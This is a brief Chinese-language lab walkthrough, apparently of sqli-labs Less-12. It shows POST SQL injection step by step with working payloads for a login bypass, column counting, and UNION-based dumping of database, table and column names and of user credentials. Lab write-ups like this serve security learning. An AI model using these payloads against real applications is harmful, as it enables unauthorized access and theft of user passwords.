# Less12

　　这关关于双引号报错post注入

　　做法与Less11一样，闭合的区别

　　由'变成")

　　尝试万能密码：")or 1=1 --+

![image](assets/image-20250426201525-f5jksdr.png)

　　判断字段数:")or 1=1 order by 2 -- lb

![image](assets/image-20250426201808-z2hnq2d.png)

![image](assets/image-20250426201855-up5tgbj.png)

　　得知有两列

　　判断显错位:")union select 1,2 --+

![image](assets/image-20250426202010-baz55hl.png)

　　判断库名：")union select 1,database() --+

![image](assets/image-20250426202058-gqkwpo2.png)

　　判断表名：")union select 1,group\_concat(table\_name) from information\_schema.tables where table\_schema\='security' --+

![image](assets/image-20250426202541-bdmr1wm.png)

　　判断列名：")union select 1,group_concat(column_name) from information_schema.columns where table_name='users' --+

![image](assets/image-20250426202623-k5dkh81.png)

　　爆出数据：")union select 1,group\_concat(username ,id , password) from users --+

![image](assets/image-20250426202704-i48v1gu.png)
